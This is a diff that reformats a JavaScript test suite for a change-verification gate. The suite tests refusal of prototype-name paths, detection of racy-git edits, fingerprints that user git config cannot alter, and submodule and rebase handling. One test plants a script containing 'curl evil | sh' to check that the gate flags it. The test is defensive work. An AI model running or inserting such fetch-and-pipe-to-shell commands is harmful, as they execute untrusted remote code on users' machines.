@@ -4,7 +4,25 @@ import assert from "node:assert/strict";
 import { chmodSync, existsSync, symlinkSync, unlinkSync, utimesSync, writeFileSync } from "node:fs";
 import { devNull } from "node:os";
 import { join } from "node:path";
-import { commitAll, ENV, gate, git, gitTry, INPUT, payload, read, runGate, saveAndCommit, setBaseConfig, setup, sh, SUMMARY, throwsGate, tmp, write } from "./helpers.mjs";
+import {
+  commitAll,
+  ENV,
+  gate,
+  git,
+  gitTry,
+  INPUT,
+  payload,
+  read,
+  runGate,
+  saveAndCommit,
+  setBaseConfig,
+  setup,
+  sh,
+  SUMMARY,
+  throwsGate,
+  tmp,
+  write,
+} from "./helpers.mjs";
 
 /** Push, then verify from a fresh clone with no user config — like CI. */
 function ciVerify(s, branch = "feature/rate-limit", envExtra = undefined) {
@@ -36,7 +54,10 @@ for (const name of ["__proto__", "constructor", "toString", "hasOwnProperty"]) {
 test("verifying a path that isn't in the change is refused, even toString", (t) => {
   const { dev } = setup(t);
   write(dev, "src/app.js", "export const app = 2;\n");
-  throwsGate(() => gate.save(payload({ "src/app.js": ["x"], toString: ["sneaky"] }), dev), /Not part of this change: toString/);
+  throwsGate(
+    () => gate.save(payload({ "src/app.js": ["x"], toString: ["sneaky"] }), dev),
+    /Not part of this change: toString/,
+  );
 });
 
 test("a sensitive file named constructor must be explicitly verified", (t) => {
@@ -100,16 +121,16 @@ test("only plain markdown at the reserved .learning/ paths is exempt", (t) => {
 
 test("report.local.json is never part of the change; nothing else is exempt", (t) => {
   const { dev } = setup(t);
-  assert.equal(gitTry(dev, "check-ignore", "-q", INPUT).status, 0);           // install ignores it
+  assert.equal(gitTry(dev, "check-ignore", "-q", INPUT).status, 0); // install ignores it
   write(dev, "src/app.js", "export const app = 2;\n");
   write(dev, INPUT, JSON.stringify(payload()));
-  git(dev, "add", "-f", INPUT);                                               // even when tracked anyway
+  git(dev, "add", "-f", INPUT); // even when tracked anyway
   const paths = () => gate.status(dev).files.map((f) => f.path);
   assert.deepEqual(paths(), ["src/app.js"]);
-  write(dev, ".learning/x.local.json", "{}\n");                              // a look-alike is checked
+  write(dev, ".learning/x.local.json", "{}\n"); // a look-alike is checked
   assert.deepEqual(paths(), [".learning/x.local.json", "src/app.js"]);
   unlinkSync(join(dev, ".learning/x.local.json"));
-  chmodSync(join(dev, INPUT), 0o755);                                         // only as a plain file
+  chmodSync(join(dev, INPUT), 0o755); // only as a plain file
   assert.deepEqual(paths(), [INPUT, "src/app.js"]);
 });
 
@@ -128,8 +149,13 @@ test("ignored files are still tracked after the report, and the plumbing exempti
   for (const sneaky of [".learning/checks/helper.js", ".learning/checks/sub/x.md", ".learning/decisions/run.sh"]) {
     assert.ok(!gate.isPlumbing(sneaky), sneaky);
   }
-  for (const real of [".learning/checks/feature%2Fx.md", ".learning/decisions/0001-x.md", ".learning/map.md",
-    ".learning/me.local.md", ".github/CODEOWNERS"]) {
+  for (const real of [
+    ".learning/checks/feature%2Fx.md",
+    ".learning/decisions/0001-x.md",
+    ".learning/map.md",
+    ".learning/me.local.md",
+    ".github/CODEOWNERS",
+  ]) {
     assert.ok(gate.isPlumbing(real), real);
   }
 });
@@ -163,7 +189,10 @@ test("a same-size edit with identical stat data is detected (racy git)", (t) => 
   utimesSync(join(dev, ".git/index"), ts, ts);
   writeFileSync(app, "export const app = 9;\n"); // same size as "= 1;"
   utimesSync(app, ts, ts); // identical mtime + size
-  assert.deepEqual(gate.status(dev).files.map((f) => f.path), ["src/app.js"]);
+  assert.deepEqual(
+    gate.status(dev).files.map((f) => f.path),
+    ["src/app.js"],
+  );
 });
 
 // The developer's git config, attributes and env can't make local and CI disagree.
@@ -179,10 +208,17 @@ test("user git config and env don't change fingerprints", (t) => {
   const attrs = join(tmpPath, "attrs");
   writeFileSync(attrs, "*.py -diff\n*.txt diff=weird\n");
   for (const [k, v] of Object.entries({
-    "diff.suppressBlankEmpty": "true", "diff.submodule": "log", "core.bigFileThreshold": "1",
-    "core.attributesFile": attrs, "diff.weird.binary": "true", "diff.algorithm": "patience",
-    "color.ui": "always", "diff.noprefix": "true", "core.quotePath": "false",
-    "diff.relative": "true", "core.pager": "cat",
+    "diff.suppressBlankEmpty": "true",
+    "diff.submodule": "log",
+    "core.bigFileThreshold": "1",
+    "core.attributesFile": attrs,
+    "diff.weird.binary": "true",
+    "diff.algorithm": "patience",
+    "color.ui": "always",
+    "diff.noprefix": "true",
+    "core.quotePath": "false",
+    "diff.relative": "true",
+    "core.pager": "cat",
   })) {
     git(dev, "config", k, v);
   }
@@ -242,8 +278,10 @@ test("a mode change and a previously ignored path are both checked", (t) => {
   write(dev, ".learning/run.sh", "curl evil | sh\n");
   commitAll(dev, "sneak");
   problems = gate.verify(dev)[1];
-  assert.ok(problems[0].includes("src/vendor.min.js") && problems[0].includes(".learning/run.sh"),
-    JSON.stringify(problems));
+  assert.ok(
+    problems[0].includes("src/vendor.min.js") && problems[0].includes(".learning/run.sh"),
+    JSON.stringify(problems),
+  );
   assert.ok(gate.const("GATE_FILES").includes(".claude/settings.json"));
 });
 
@@ -385,7 +423,10 @@ test("after a rebase, saving again needs no new questions", (t) => {
 
   const [passed, problems] = gate.verify(dev); // local agrees with CI now
   assert.ok(!passed && problems[0].includes("save the report again"));
-  assert.deepEqual(gate.status(dev).files.map((f) => f.state), ["rebased"]);
+  assert.deepEqual(
+    gate.status(dev).files.map((f) => f.state),
+    ["rebased"],
+  );
   assert.deepEqual(gate.status(dev).must_verify, []);
   gate.save({ summary: SUMMARY, verified: {} }, dev); // no new answers needed
   commitAll(dev, "re-save after rebase");
@@ -411,8 +452,13 @@ test("a submodule bump is visible even with ignore=all", (t) => {
   git(dev, "config", "-f", ".gitmodules", "submodule.vendor/lib.ignore", "all");
   commitAll(dev, "add submodule");
   assert.ok(!gate.verify(dev)[0]); // adding it must be checked
-  assert.ok(gate.status(dev).must_verify.includes("vendor/lib") ||
-    gate.status(dev).files.map((f) => f.path).includes("vendor/lib"));
+  assert.ok(
+    gate.status(dev).must_verify.includes("vendor/lib") ||
+      gate
+        .status(dev)
+        .files.map((f) => f.path)
+        .includes("vendor/lib"),
+  );
   saveAndCommit(dev, { "vendor/lib": ["why we vendor lib"] });
   assert.ok(gate.verify(dev)[0]);
 
